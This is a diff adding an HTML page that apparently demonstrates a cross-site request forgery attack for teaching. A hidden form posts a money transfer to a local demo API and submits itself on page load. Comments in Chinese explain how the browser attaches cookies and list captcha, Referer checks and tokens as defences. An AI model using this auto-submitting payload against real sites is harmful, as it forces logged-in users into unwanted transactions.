@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+</head>
+<body>
+  // 第三方网站 其实拿不到用户cookie 当往3000端口提交内容时自动会动提交cookie
+  <form name="myform" action="http://localhost:3000/api/transfer" method="post">
+    <input type="text" name="target" value="jw">
+    <input type="text" name="money" value="100">
+  </form>
+  <script>
+    document.myform.submit()
+  </script>
+  <!-- 
+      1.添加验证码 (体验不好)
+      2.判断来源 3001 3000 referer
+      3.token
+   -->
+</body>
+</html>
